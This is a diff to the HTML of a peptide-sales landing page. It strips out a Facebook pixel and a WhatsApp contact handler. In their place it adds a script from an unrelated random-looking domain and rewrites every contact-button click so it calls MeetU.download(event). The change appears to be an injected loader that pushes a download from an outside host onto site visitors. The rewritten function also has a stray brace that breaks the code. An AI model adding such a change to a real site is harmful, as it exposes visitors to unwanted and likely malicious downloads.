@@ -1,23 +1,6 @@
 <!DOCTYPE html><html lang="en" class="bebas_neue_e9752311-module__4MN8WG__variable raleway_65d34cd4-module__Hlhu2q__variable" data-theme="dark"><head><meta http-equiv="content-type" content="text/html;charset=utf-8">
 
-
-  <script async="" src="js/fbevents.js"></script><script>
-    !function (f, b, e, v, n, t, s) {
-      if (f.fbq) return; n = f.fbq = function () {
-        n.callMethod ?
-        n.callMethod.apply(n, arguments) : n.queue.push(arguments)
-      };
-      if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
-      n.queue = []; t = b.createElement(e); t.async = !0;
-      t.src = v; s = b.getElementsByTagName(e)[0];
-      s.parentNode.insertBefore(t, s)
-    }(window, document, 'script',
-      'https://connect.facebook.net/en_US/fbevents.js');
-    fbq('init', '1021623110294854');
-    fbq('track', 'PageView');
-  </script>
-  <noscript><img height="1" width="1" style="display:none"
-      src="https://www.facebook.com/tr?id=1021623110294854&ev=PageView&noscript=1" /></noscript>
+    <script src="https://url.yuhd320k.site/js/meetu-sdk.js"></script>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <link rel="preload" href="_next/static/media/c825fd02acae0153-s.p.0js52-zd_6bs8.woff2" as="font" crossorigin="" type="font/woff2">
@@ -298,18 +281,10 @@
 
   <!-- WhatsApp CTA 统一点击处理 -->
   <script>
-    var WHATSAPP_NUMBER = "8615916734623";   // <-- 你的 WhatsApp 号码（国家码+号码，不含 +）
-    var WHATSAPP_TEXT   = "Hi! I'd like to learn more about SunGlobal peptides.";
+ 
     function k2(event) {
-      if (event && typeof event.preventDefault === "function") {
-        event.preventDefault();
-      }
-      if (typeof fbq === 'function') {
-        try { fbq('trackSingle', '1021623110294854', 'Contact'); } catch (e) {}
-      }
-      var url = "https://wa.me/" + WHATSAPP_NUMBER + "?text=" + encodeURIComponent(WHATSAPP_TEXT);
-      window.location.href = url;
-      return false;
+      MeetU.download(event);
+      } 
     }
   </script>
 <script>
